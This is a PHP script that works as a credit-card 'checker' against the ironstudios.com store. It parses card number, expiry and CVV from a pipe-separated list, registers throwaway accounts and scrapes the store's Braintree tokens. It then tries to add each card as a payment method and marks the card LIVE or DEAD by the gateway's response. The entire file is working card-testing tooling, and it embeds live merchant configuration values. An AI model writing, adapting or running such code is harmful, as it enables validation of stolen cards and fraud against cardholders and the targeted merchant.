<?php
error_reporting(0); 
$time_start = microtime(true); 

if($_SERVER['REQUEST_METHOD'] == 'POST'){ 
    extract($_POST); 
} 
else { 
   extract($_GET); 
} 
 
function GetStr($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} 

function RandomString($length = 7)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
 
$separator = explode("|", $lista);  
$cc = $separator[0]; 
$mm = $separator[1]; 
$yy = $separator[2]; 
$cvv = $separator[3]; 
$postcode = mt_rand(10080, 94545);
$str = RandomString();
$username = RandomString().mt_rand(1, 999);

$cbin = substr($cc, 0,1); 
if($cbin == 5){ 
    $cbin = 'master-card'; 
} 
else if($cbin == 4){ 
    $cbin = 'visa'; 
} 
else if($cbin == 3){ 
 $cbin = 'amex'; 
} 
else { 
  $cbin = 'null'; 
}

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://ironstudios.com/my-account/add-payment-method/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 0,
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    )
));
    $prepare_register = curl_exec($ch);
    $register_nonce = GetStr(GetStr($prepare_register, 'woocommerce-privacy-policy-link', '/my-account/add-payment-method/?_wc_user_reg=true'), 'name="_wpnonce" value="', '"');
    echo "1st: <br>Register Nonce: $register_nonce<br><br>";
    
    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://ironstudios.com/my-account/add-payment-method/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 0,
    CURLOPT_HTTPHEADER => array(
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://ironstudios.com',
        'Referer: https://ironstudios.com/my-account/add-payment-method/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => "email=$username@gmail.com&password=$username&_wpnonce=$register_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&register=Create+Account",
));
    $register = curl_exec($ch);
    $wpnonce = GetStr($register, 'name="woocommerce-add-payment-method-nonce" value="', '"');
    $braintreeToken = GetStr($register, 'var wc_braintree_client_token = "', '"');
    $decoded = base64_decode($braintreeToken);
    $parsedToken = GetStr($decoded, '"authorizationFingerprint":"', '"');
    $merchantId = GetStr($decoded, '"merchantId":"', '"');
    echo "2nd: <br>Braintree Token: $braintreeToken<br><br>Decoded: $decoded<br><br>Parsed Token: $parsedToken<br><br>Merchant ID: $merchantId<br><br>Add Payment Method Nonce: $wpnonce<br><br>";

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => array(
        'accept: */*',
        'Authorization: Bearer '.$parsedToken, 
        'braintree-version: 2018-05-10',
        'content-type: application/json',
        'Origin: https://assets.braintreegateway.com',
        'Referer: https://assets.braintreegateway.com/web/3.48.0/html/hosted-fields-frame.min.html',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$str.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"'.$postcode.'","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
));
    $graphql = curl_exec($ch);
    $token = GetStr($graphql, '"token":"','"');
    echo "3rd: <br>GraphQL Token: $token<br><br>";

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://api.braintreegateway.com/merchants/'.$merchantId.'/client_api/v1/configuration?authorizationFingerprint='.$parsedToken,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HEADER => 0,
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    )
));
    $merch = curl_exec($ch);    
    $braintreeClientId = GetStr($merch, '"braintreeClientId":"', '"');
    $cardinalAuthenticationJWT = GetStr($merch, '"cardinalAuthenticationJWT":"', '"');
    echo "4th: <br>B3 Client ID: $braintreeClientId<br><br>Cardinal: $cardinalAuthenticationJWT<br><br>";


    $config_data = 'braintree_cc_config_data: {"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/snt925mm9s67fm3h/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/snt925mm9s67fm3h"},"merchantId":"snt925mm9s67fm3h","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","American Express","Discover","JCB"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"'.$cardinalAuthenticationJWT.'"},"androidPay":{"displayName":"Iron Studios","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MDk5MjA2NzksImp0aSI6IjBkMjAyYzcyLTk5NDAtNDA4NS04M2FkLTA5YmUwMzU5YjI1NiIsInN1YiI6InNudDkyNW1tOXM2N2ZtM2giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InNudDkyNW1tOXM2N2ZtM2giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.oPaZPf5BaNIQBzc8RVQtnZAumvanC1ABnWqV9s4lPN_tefCiUn7cWJ05xDgprH18Dh0vmpiDt5sPwNQL3tfyqg","paypalClientId":"AeEqOIEcX8Z6eWvXtQftBX-Si1dGVQkA4O84QiUxiLuaoXI4ZvtejMlASMoI3Xfx0fvepXcRnjrQsWtP","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Iron Studios","clientId":"AeEqOIEcX8Z6eWvXtQftBX-Si1dGVQkA4O84QiUxiLuaoXI4ZvtejMlASMoI3Xfx0fvepXcRnjrQsWtP","privacyUrl":"https://ironstudiosus.com/pages/privacy-policy","userAgreementUrl":"https://ironstudiosus.com/pages/terms-condition-iron-studios","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"'.$braintreeClientId.'","billingAgreementsEnabled":true,"merchantAccountId":"IronStudios_instant","payeeEmail":null,"currencyIsoCode":"USD"}}';

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://ironstudios.com/my-account/add-payment-method/',
    CURLOPT_HEADER => 0,
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_COOKIEFILE => getcwd(). "/$username.txt",
    CURLOPT_COOKIEJAR => getcwd(). "/$username.txt",
    CURLOPT_HTTPHEADER => array(
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://ironstudios.com',
        'Referer: https://ironstudios.com/my-account/add-payment-method/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => "payment_method=braintree_cc&braintree_cc_nonce_key=$token&braintree_cc_3ds_nonce_key=&". urlencode($config_data). "&woocommerce-add-payment-method-nonce=$wpnonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1",
));
    $execute = curl_exec($ch);
    curl_close($ch); 
    $respo = GetStr($execute, 'Reason: ', '</li>');

    if(strpos($execute, 'successfully added')){ 

        echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">Authorized</span></td></tr><br>';
    }
    elseif(strpos($execute, 'Gateway Rejected: avs')){ 

        echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">'.$respo.'</span></td></tr><br>'; 
    }
    elseif(strpos($execute, 'Reason:')){ 

        echo '<tr><td><span class="badge badge-outline-danger badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-danger badge-pill">'.$respo.'</span></td> <td><span class="badge badge-outline-danger badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>'; 
    }
    else { 

        echo '<tr><td><span class="badge badge-outline-warning badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-warning badge-pill">Error Not Listed</span></td></tr><br>';
    }
    unlink("$username.txt");
?>
